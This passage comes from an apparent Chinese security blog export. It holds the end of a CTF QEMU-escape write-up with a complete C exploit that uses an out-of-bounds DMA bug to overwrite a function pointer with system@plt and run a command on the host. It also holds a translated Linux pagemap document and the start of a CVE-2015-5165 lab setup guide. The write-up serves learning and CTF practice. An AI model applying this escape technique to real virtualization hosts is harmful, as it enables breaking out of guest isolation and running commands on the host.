<li>cmd = 1，就从<code>opaque-&gt;dma.src</code>所指向的物理内存往<code>opaque-&gt;dma_buf[opaque-&gt;dma.dst-0x40000]</code>复制<code>opaque-&gt;dma.cnt</code>个字节</li>
<li>cmd = 1 | 2，就从<code>opaque-&gt;dma_buf[opaque-&gt;dma.src-0x40000]</code>往<code>opaque-&gt;dma.dst</code>所指向的物理内存复制<code>opaque-&gt;dma.cnt</code>个字节</li>
<li>cmd = 1 | 2 | 4，就调用<code>opaque-&gt;enc</code>函数，参数为<code>opaque-&gt;dma_buf[opaque-&gt;dma.src-0x40000]</code>和<code>opaque-&gt;dma.cnt</code></li>
</ul>
<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>漏洞点在于，cmd = 1和cmd = 2的时候，从<code>dma_buf</code>存取数据的时候没有检查index的大小，会导致越界存取</p>
<p>而<code>dma_buf</code>之后恰好就是<code>enc</code>，因此我们可以通过从<code>enc</code>取值来得到ELF的基地址，然后计算<code>system</code>的<code>plt</code>，然后将<code>enc</code>覆盖成<code>system</code>的<code>plt</code>，最后往<code>dma_buf</code>里面写入指令，例如<code>cat flag</code>，这样，当设置<code>cmd</code>为<code>1|2|4</code>的时候就可以调用<code>system(&quot;cat flag&quot;)</code></p>
<p>为什么这样可以完成虚拟机逃逸呢？因为我们这些包括<code>system(&quot;cat flag&quot;)</code>都不是在虚拟机内的进程执行的，而是qemu本身的进程执行的，所以这样就可以完成虚拟化逃逸</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> page_offset(<span class="keyword">uint64_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gfn(<span class="keyword">void</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"open pagemap"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> *mmio_address;</span><br><span class="line"><span class="keyword">uint8_t</span> *user_buf;</span><br><span class="line"><span class="keyword">uint64_t</span> user_phy_buf;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> offset, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_address + offset)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_dma_src</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x80</span>, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_dma_dst</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x88</span>, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_dma_cnt</span><span class="params">(<span class="keyword">uint32_t</span> cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x90</span>, cnt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_dma_cmd</span><span class="params">(<span class="keyword">uint32_t</span> cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x98</span>, cmd);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> read_dma(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    set_dma_src(addr+<span class="number">0x40000</span>);</span><br><span class="line">    set_dma_cnt(<span class="number">8</span>);</span><br><span class="line">    set_dma_dst(user_phy_buf);</span><br><span class="line">    set_dma_cmd(<span class="number">1</span>|<span class="number">2</span>);</span><br><span class="line">    <span class="comment">//set_dma_cmd(0);</span></span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint64_t</span>*)user_buf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_dma</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">void</span> *buf, <span class="keyword">uint32_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(user_buf, buf, size);</span><br><span class="line">    set_dma_src(user_phy_buf);</span><br><span class="line">    set_dma_dst(addr+<span class="number">0x40000</span>);</span><br><span class="line">    set_dma_cnt(size);</span><br><span class="line">    set_dma_cmd(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//set_dma_cmd(0);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trigger_enc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_dma_src(<span class="number">0</span>+<span class="number">0x40000</span>);</span><br><span class="line">    set_dma_cnt(<span class="number">0</span>);</span><br><span class="line">    set_dma_cmd(<span class="number">1</span>|<span class="number">2</span>|<span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"mmio fd open error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_address = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_address == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"mmio mmap error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    user_buf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(user_buf == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"mmio mmap error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mlock(user_buf, <span class="number">0x1000</span>);</span><br><span class="line">    user_phy_buf = gva_to_gpa(user_buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] user phy buf: %p\n"</span>, user_phy_buf);</span><br><span class="line">    <span class="keyword">uint64_t</span> enc_address = read_dma(<span class="number">4096</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] leak enc address: %p\n"</span>, enc_address);</span><br><span class="line">    <span class="keyword">uint64_t</span> text_base = enc_address - <span class="number">0x283DD0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] text base: %p\n"</span>, text_base);</span><br><span class="line">    <span class="keyword">uint64_t</span> system_plt = text_base + <span class="number">0x1FDB18</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] system plt: %p\n"</span>, system_plt);</span><br><span class="line">    write_dma(<span class="number">4096</span>, &amp;system_plt, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[] = <span class="string">"cat /flag"</span>;</span><br><span class="line">    write_dma(<span class="number">0</span>, buf, <span class="number">10</span>);</span><br><span class="line">    trigger_enc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下的pagemap文件（翻译）</title>
    <url>/2020/02/15/linux%E4%B8%8B%E7%9A%84pgemap%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>原文：<a href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/vm/pagemap.txt</a></p>
<a id="more"></a>
<h1 id="用户空间角度下的pagemap"><a href="#用户空间角度下的pagemap" class="headerlink" title="用户空间角度下的pagemap"></a>用户空间角度下的pagemap</h1><p><code>pagemap</code>是内核中的一组新的接口，允许用户空间的程序通过读取<code>/proc</code>下的文件来检查页表及相关信息</p>
<p><code>pagemap</code>文件包括四个组件：</p>
<ul>
<li><p><code>/proc/pid/pagemap</code>  该文件可以使一个用户空间的进程找到每一个虚拟页面映射到哪个物理帧。它为每一个物理页面包含一个64位的值，该值包含以下数据：</p>
<ul>
<li><code>0-54</code>位是页帧号<code>(page frame number aka PFN)</code> if present<ul>
<li><code>0-4</code>位是交换类型<code>(swap type)</code> if swapped</li>
<li><code>5-54</code>位是交换偏移<code>(swap offset)</code> if swapped</li>
</ul>
</li>
<li><code>55</code>位表示<code>pte is soft-dirty</code></li>
<li><code>56</code>位表示完全映射页<code>(page exclusively mapped)</code>（从linux4.2开始）</li>
<li><code>57-60</code>位为0</li>
<li><code>61</code>位表示页是文件页<code>(file-page)</code>还是匿名共享<code>(shared-anon)</code>（从linux3.5开始）</li>
<li><code>62</code>位表示页被交换<code>(swapped)</code></li>
<li><code>63</code>位表示页存在<code>(present)</code></li>
</ul>
<p>从linux4.0开始，只有拥有<code>CAP_SYS_ADMIN</code>特权的用户才能得到<code>PFN</code>这些数据。在4.0和4.1版本如果无此特权打开该文件，会失败并返回<code>-EPERM</code>。从linux4.2开始，如果用户没有此特权的话，读取<code>PFN</code>会得到0。原因就是<code>PFn</code>等数据的信息会帮助漏洞的利用</p>
<p>如果页不存在但是在交换区，<code>PFN</code>就会包含编码后的交换文件号以及该页在交换区的偏移。未被映射的页返回空的<code>PFN</code>，这样就能精确地确定映射（或交换）了哪些页面，并在进程之间比较映射的页面</p>
<p>高效的用户使用这个接口的话，会先用<code>/proc/pid/maps</code>来确定内存的哪些区域被映射了，然后使用<code>lseek</code>去跳过未被映射的区域</p>
</li>
<li><p><code>/proc/kpagecount</code>  该文件包含每个页被映射的次数，该次数是一个64位的数字，以<code>PFN</code>作为索引</p>
</li>
<li><p><code>/proc/kpageflags</code>  该文件包含每个页的一组64位的flags，以<code>PFN</code>作为索引</p>
<p>flags为：</p>
</li>
</ul>
<ol start="0">
<li>LOCKED</li>
<li>ERROR</li>
<li>REFERENCED</li>
<li>UPTODATE</li>
<li>DIRTY</li>
<li>LRU</li>
<li>ACTIVE</li>
<li>SLAB</li>
<li>WRITEBACK</li>
<li>RECLAIM</li>
<li>BUDDY</li>
<li>MMAP</li>
<li>ANON</li>
<li>SWAPCACHE</li>
<li>SWAPBACKED</li>
<li>COMPOUND_HEAD</li>
<li>COMPOUND_TAIL</li>
<li>HUGE</li>
<li>UNEVICTABLE</li>
<li>HWPOISON</li>
<li>NOPAGE</li>
<li>KSM</li>
<li>THP</li>
<li>BALLOON</li>
<li>ZERO_PAGE</li>
<li>IDLE</li>
</ol>
<ul>
<li><code>/proc/kpagecgrope</code>  该文件包含每个页面管理的内存的cgroup的64位inode编号，以<code>PFN</code>为索引，只在<code>CONFIG_MEMCG</code>被设置后才可用</li>
</ul>
<p>对页标志的简短介绍：</p>
<ol start="0">
<li><p><code>LOCKED</code>页被锁定为独占访问，例如，正在经受<code>read/write IO</code></p>
</li>
<li><p>当连续页<code>(compound page)</code>被使用的时候，<code>SLAB</code>页被<code>SLAB/SLOB/SLUB/SLQB</code>内核内存分配器管理</p>
</li>
<li><p><code>BUDDY</code>一个空闲的内存锁，由伙伴系统分配器管理。伙伴系统以各种顺序组织空闲内存。一个次序为N的块有$2^N$个物理上连续的页面，其中只有第一个页面设置了<code>BUDDY</code>标志</p>
</li>
<li><p><code>COMPOUND_HEAD</code></p>
</li>
<li><p><code>COMPOUND_TAIL</code>一个次序为N的连续页<code>(compound page)</code>包含$2^N$个物理连续页。一个次序为2的连续页的形式为“HTTT”，H指它是头页，T表示它（它们）是尾页。连续页的只要消耗着是<code>hugeTLB page</code>，<code>SLUB</code>，例如，内存分配器不同的设备驱动器。然而在这个接口中，只有<code>huge/giga pages</code>能被<code>end users</code>看到。</p>
</li>
<li><p><code>HUGE</code>这是<code>HugeTLB page</code>的组成页面</p>
</li>
<li><p><code>HWPOISON</code>硬件在此页上检测内存损坏：不要触碰这里的数据！</p>
</li>
<li><p><code>NOPAGE</code>在请求的地址没有页帧存在</p>
</li>
<li><p><code>KSM</code>在一个或多个进程之间动态共享的相同内存页</p>
</li>
<li><p><code>THP</code>相连的用来构造透明的大页面的页面</p>
</li>
<li><p><code>BALLOON</code>  ballon compaction page  涨大的压缩页面？？？</p>
</li>
<li><p><code>ZERO_PAGE</code>  zero page for pfn_zero or huge_zero page</p>
</li>
<li><p><code>IDLE</code>页面从被标记为<code>idle</code>开始就没有被访问。需要注意的是，如果通过<code>PTE</code>访问该页面，此标志可能会过时。要确保该标志是最新的，必须先读取<code>/sys/kernel/mm/page_idle/bitmap</code></p>
<p>[ IO相关的页标志 ]</p>
<ol>
<li><p><code>ERROR</code>  IO错误已发生</p>
</li>
<li><p><code>UPTODATE</code>页面有最新数据</p>
<blockquote>
<p>   ie. for file backed page: (in-memory data revision &gt;= on-disk one)</p>
</blockquote>
</li>
<li><p><code>DIRTY</code>页以及被写入，因此包含新数据</p>
<blockquote>
<p>   ie. for file backed page: (in-memory data revision &gt;  on-disk one)</p>
</blockquote>
</li>
<li><p><code>WRITEBACK</code>页已经被同步到硬盘</p>
</li>
<li><p><code>LRU</code>页在<code>LRU lists</code>之一之内</p>
</li>
<li><p><code>ACTIVE</code>页在<code>active LRU list</code>之内</p>
</li>
</ol>
</li>
<li><p><code>UNEVICTABLE</code>页在<code>unevictable (non-)LRU list</code>之内</p>
<blockquote>
<p>它以某种方式固定，而不是LRU页面回收的候选</p>
</blockquote>
<ol start="2">
<li><code>REFERENCED</code>自从上次<code>LRU list</code>入队/重新入对以来已经重新引用该页面</li>
<li><code>RECLAIM</code>页面输出IO完成后将立即回收该页面</li>
</ol>
</li>
<li><p><code>MMAP</code>一个内存映射页</p>
</li>
<li><p><code>ANON</code>一个非文件的一部分的内存映射页</p>
</li>
<li><p><code>SWAPCACHE</code>页被映射到交换空间，例如，有一个相关的交换入口</p>
</li>
<li><p><code>SWAPBACKED</code>页由swap/RAM支持</p>
</li>
</ol>
<blockquote>
<p>The page-types tool in the tools/vm directory can be used to query the above flags.</p>
</blockquote>
<p>用<code>pagemap</code>做一些有用的事情：</p>
<p>使用<code>pagemap</code>查找进程的内存使用情况像是如下这样：</p>
<ol>
<li>读取<code>/proc/pid/maps</code>来确定内存空间中的哪一部分映射到了什么</li>
<li>选择你需要的部分</li>
<li>打开<code>/proc/pid/pagemap</code>并找到想要检查的页面</li>
<li>从<code>pagemap</code>为每一页读取一个<code>uint64</code></li>
<li>打开<code>/proc/kpagecount</code>和/或<code>/proc/kpageflags</code>。你所读取的每一个<code>PFN</code>,查找文件中的那个条目，并读取所需的数据</li>
</ol>
<p>例如，为了找到<code>&quot;unique set size&quot; (USS)</code>，即只被一个内存独享的内存的数量。你可以遍历进程中的每个映射，超导<code>PFN</code>，然后在<code>kpagecount</code>中查找他们，并计算仅被引用一次的页面的个数</p>
<p>注意事项：</p>
<p>如果没有从8字节的边界开始读取，或者读取的大小不是8的倍数，读任何文件都会返回<code>-EINVAL</code></p>
<p>在linux3.11之前，<code>pagemap</code>的<code>55-60</code>位被用作表示<code>page-shift</code>（在某些架构里总是12）。从Linux 3.11开始，它们的含义在先清除<code>soft-dirty bits</code>后才改变。 从Linux 4.2开始，它们无条件地用于标志。</p>
<h1 id="soft-dirty"><a href="#soft-dirty" class="headerlink" title="soft-dirty"></a>soft-dirty</h1><p>原文：<a href="https://www.kernel.org/doc/Documentation/vm/soft-dirty.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/vm/soft-dirty.txt</a></p>
<p><code>soft-dirty</code>是<code>PTE</code>的一位，用来帮助跟踪任务写入的页面。为了完成跟踪，页面应该：</p>
<ol>
<li><p>从任务的<code>PTEs</code>清除<code>soft-dirty</code>位</p>
</li>
<li><p>wait some time</p>
</li>
<li><p>从<code>PTEs</code>读取<code>soft-dirty</code>位</p>
<p>读取<code>/proc/pid/pagemap</code>来完成此任务，第55位就是<code>soft-dirty</code>位。如果设置此位，就从步骤1开始写入相应的<code>PTE</code></p>
</li>
</ol>
<p>在内部，为了进行跟踪，当<code>soft-dirty</code>位被清除时，可写位被从<code>PTE</code>中清除。因此，在此之后，当任务试图修改某个虚拟地址处的页面时，<code>#PF</code>会出现，内核会在相应的<code>PTE</code>上设置<code>soft-dirty</code>位。</p>
<p>请注意，尽管在清除<code>soft-dirty</code>位后，所有任务的地址空间都标记为r / o，但是在此之后发生的<code>PF-s</code>将被快速处理。 之所以如此，是因为页面仍被映射到物理内存，因此内核所做的一切就是找出这一事实，并将可写位和<code>soft-dirty</code>位都放在<code>PTE</code>上。</p>
<p>虽然在大多数情况下，通过<code>#PF-s</code>来跟踪内存更改已经足够了，但是仍然存在这样一种情况，即我们可能会丢失<code>soft-dirty</code>位——一个任务取消映射一个以前映射的内存区域，然后在完全相同的位置映射一个新的内存区域。当<code>unmap</code>被调用时，内核内部会清除包括软脏位在内的<code>PTE</code>值。为了将这种内存区域更新通知用户空间应用程序，内核总是将新的内存区域(和扩展的区域)标记为<code>soft-dirty</code>。</p>
]]></content>
      <categories>
        <category>翻译</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>qemu CVE-2015-5165 信息泄露漏洞</title>
    <url>/2020/02/13/qemu-CVE-2015-5165-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>参考：<a href="https://www.anquanke.com/post/id/197637#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197637#h2-0</a></p>
<p>主要参考：<a href="http://www.phrack.org/papers/vm-escape-qemu-case-study.html" target="_blank" rel="noopener">http://www.phrack.org/papers/vm-escape-qemu-case-study.html</a></p>
<a id="more"></a>

<h1 id="CVE-2015-5165"><a href="#CVE-2015-5165" class="headerlink" title="CVE-2015-5165"></a>CVE-2015-5165</h1><blockquote>
<p>The C+ mode offload emulation in the RTL8139 network card device model in QEMU, as used in Xen 4.5.x and earlier, allows remote attackers to read process heap memory via unspecified vectors.</p>
<p>QEMU中使用的RTL8139网卡设备模型的Xen 4.5.x和更早版本中的C +模式卸载仿真允许远程攻击者通过未指定的向量读取进程堆内存。</p>
</blockquote>
<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><h2 id="编译qemu"><a href="#编译qemu" class="headerlink" title="编译qemu"></a>编译qemu</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone git://git.qemu-project.org/qemu.git</span><br><span class="line">cd qemu</span><br><span class="line">git checkout bd80b59</span><br><span class="line">mkdir -p bin/debug/naive</span><br><span class="line">cd bin/debug/naive</span><br><span class="line">../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<h2 id="生成镜像文件脚本"><a href="#生成镜像文件脚本" class="headerlink" title="生成镜像文件脚本"></a>生成镜像文件脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir rootfs</span><br><span class="line"></span><br><span class="line">sudo debootstrap --include=openssh-server,curl,tar,gcc,</span><br><span class="line">libc6-dev,time,strace,sudo,less,psmisc,</span><br><span class="line">selinux-utils,policycoreutils,checkpolicy,selinux-policy-default </span><br><span class="line">stretch rootfs</span><br><span class="line"></span><br><span class="line">set -eux</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set some defaults and <span class="built_in">enable</span> promtless ssh to the machine <span class="keyword">for</span> root.</span></span><br><span class="line">sudo sed -i '/^root/ &#123; s/:x:/::/ &#125;' rootfs/etc/passwd</span><br><span class="line">echo 'T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100' | sudo tee -a rootfs/etc/inittab</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">printf</span> <span class="string">'nauto enp0s3niface enp0s3 inet dhcpn'</span> | sudo tee -a qemu/etc/network/interfaces</span></span><br><span class="line">printf 'nallow-hotplug enp0s3niface enp0s3 inet dhcpn' | sudo tee -a rootfs/etc/network/interfaces</span><br><span class="line">echo 'debugfs /sys/kernel/debug debugfs defaults 0 0' | sudo tee -a rootfs/etc/fstab</span><br><span class="line">echo "kernel.printk = 7 4 1 3" | sudo tee -a rootfs/etc/sysctl.conf</span><br><span class="line">echo 'debug.exception-trace = 0' | sudo tee -a rootfs/etc/sysctl.conf</span><br><span class="line">echo "net.core.bpf_jit_enable = 1" | sudo tee -a rootfs/etc/sysctl.conf</span><br><span class="line">echo "net.core.bpf_jit_harden = 2" | sudo tee -a rootfs/etc/sysctl.conf</span><br><span class="line">echo "net.ipv4.ping_group_range = 0 65535" | sudo tee -a rootfs/etc/sysctl.conf</span><br><span class="line">echo -en "127.0.0.1tlocalhostn" | sudo tee rootfs/etc/hosts</span><br><span class="line">echo "nameserver 8.8.8.8" | sudo tee -a rootfs/etc/resolve.conf</span><br><span class="line">echo "ubuntu" | sudo tee rootfs/etc/hostname</span><br><span class="line">sudo mkdir -p rootfs/root/.ssh/</span><br><span class="line">rm -rf ssh</span><br><span class="line">mkdir -p ssh</span><br><span class="line">ssh-keygen -f ssh/id_rsa -t rsa -N ''</span><br><span class="line">cat ssh/id_rsa.pub | sudo tee rootfs/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Build a disk image</span></span><br><span class="line">dd if=/dev/zero of=rootfs.img bs=1M seek=2047 count=1</span><br><span class="line">sudo mkfs.ext4 -F rootfs.img</span><br><span class="line">sudo mkdir -p /mnt/rootfs</span><br><span class="line">sudo mount -o loop rootfs.img /mnt/rootfs</span><br><span class="line">sudo cp -a rootfs/. /mnt/rootfs/.</span><br><span class="line">sudo umount /mnt/rootfs</span><br></pre></td></tr></table></figure>

<p>这里我遇到了坑，在生成的<code>rootfs</code>文件夹下的<code>etc/network/interface</code>文件中，它生成的文件内容是错误的，就会导致系统启动的时候<code>network</code>服务无法正常启动，错误之处很简单，应该是生成这个文件的时候，本来想写进去<code>\n</code>的，结果写成了<code>n</code></p>
<h2 id="编译linux内核"><a href="#编译linux内核" class="headerlink" title="编译linux内核"></a>编译linux内核</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.2.11.tar.xz -O linux-5.2.11.tar.xz</span><br><span class="line">tar -xvf linux-5.2.11.tar.xz</span><br><span class="line">make defconfig</span><br><span class="line">make kvmconfig</span><br><span class="line"><span class="meta">#</span><span class="bash">编辑 .config 文件， 将 CONFIG_8139CP=y 和 CONFIG_PCNET32=y 打开</span></span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure>

<h1 id="RTL8139的一些信息"><a href="#RTL8139的一些信息" class="headerlink" title="RTL8139的一些信息"></a>RTL8139的一些信息</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这是RTL8139的寄存器的偏移</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers &#123;</span><br><span class="line">    MAC0 = <span class="number">0</span>,        <span class="comment">/* Ethernet hardware address. */</span></span><br><span class="line">    MAR0 = <span class="number">8</span>,        <span class="comment">/* Multicast filter. */</span></span><br><span class="line">    TxStatus0 = <span class="number">0x10</span>,<span class="comment">/* Transmit status (Four 32bit registers). C mode only */</span></span><br><span class="line">                     <span class="comment">/* Dump Tally Conter control register(64bit). C+ mode only */</span></span><br><span class="line">    TxAddr0 = <span class="number">0x20</span>,  <span class="comment">/* Tx descriptors (also four 32bit). */</span></span><br><span class="line">    RxBuf = <span class="number">0x30</span>,</span><br><span class="line">    ChipCmd = <span class="number">0x37</span>,</span><br><span class="line">    RxBufPtr = <span class="number">0x38</span>,</span><br><span class="line">    RxBufAddr = <span class="number">0x3A</span>,</span><br><span class="line">    IntrMask = <span class="number">0x3C</span>,</span><br><span class="line">    IntrStatus = <span class="number">0x3E</span>,</span><br><span class="line">    TxConfig = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig = <span class="number">0x44</span>,</span><br><span class="line">    Timer = <span class="number">0x48</span>,        <span class="comment">/* A general-purpose counter. */</span></span><br><span class="line">    RxMissed = <span class="number">0x4C</span>,    <span class="comment">/* 24 bits valid, write clears. */</span></span><br><span class="line">    Cfg9346 = <span class="number">0x50</span>,</span><br><span class="line">    Config0 = <span class="number">0x51</span>,</span><br><span class="line">    Config1 = <span class="number">0x52</span>,</span><br><span class="line">    FlashReg = <span class="number">0x54</span>,</span><br><span class="line">    MediaStatus = <span class="number">0x58</span>,</span><br><span class="line">    Config3 = <span class="number">0x59</span>,</span><br><span class="line">    Config4 = <span class="number">0x5A</span>,        <span class="comment">/* absent on RTL-8139A */</span></span><br><span class="line">    HltClk = <span class="number">0x5B</span>,</span><br><span class="line">    MultiIntr = <span class="number">0x5C</span>,</span><br><span class="line">    PCIRevisionID = <span class="number">0x5E</span>,</span><br><span class="line">    TxSummary = <span class="number">0x60</span>, <span class="comment">/* TSAD register. Transmit Status of All Descriptors*/</span></span><br><span class="line">    BasicModeCtrl = <span class="number">0x62</span>,</span><br><span class="line">    BasicModeStatus = <span class="number">0x64</span>,</span><br><span class="line">    NWayAdvert = <span class="number">0x66</span>,</span><br><span class="line">    NWayLPAR = <span 